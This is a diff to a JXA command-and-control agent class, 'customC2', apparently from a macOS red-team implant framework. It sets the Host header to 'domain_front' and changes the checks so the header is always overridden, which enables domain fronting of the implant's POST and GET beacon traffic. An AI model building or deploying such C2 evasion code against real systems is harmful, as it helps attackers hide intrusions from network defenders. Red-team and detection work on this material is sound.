@@ -3,7 +3,7 @@ class customC2 extends baseC2{
 	constructor(interval, baseurl){
 		super(interval, baseurl);
 		this.commands = [];
-		this.host_header = "YYY";
+		this.host_header = "domain_front";
 	}
 	getConfig(){
 		//A RESTful base config consists of the following:
@@ -75,7 +75,7 @@ class customC2 extends baseC2{
 				var postData = data.dataUsingEncodingAllowLossyConversion($.NSString.NSASCIIStringEncoding, true);
 				var postLength = $.NSString.stringWithFormat("%d", postData.length);
 				req.addValueForHTTPHeaderField(postLength, $.NSString.alloc.initWithUTF8String('Content-Length'));
-				if( this.host_header.length > 3){
+				if( this.host_header.length > 0){
 				    req.setValueForHTTPHeaderField($.NSString.alloc.initWithUTF8String(this.host_header), $.NSString.alloc.initWithUTF8String("Host"));
 				}
 				req.setHTTPBody(postData);
@@ -97,7 +97,7 @@ class customC2 extends baseC2{
 	        try{
 	            var req = $.NSMutableURLRequest.alloc.initWithURL($.NSURL.URLWithString(url));
                 req.setHTTPMethod($.NSString.alloc.initWithUTF8String("GET"));
-                if( this.host_header.length > 3){
+                if( this.host_header.length > 0){
                     req.setValueForHTTPHeaderField($.NSString.alloc.initWithUTF8String(this.host_header), $.NSString.alloc.initWithUTF8String("Host"));
                 }
                 var response = Ref();
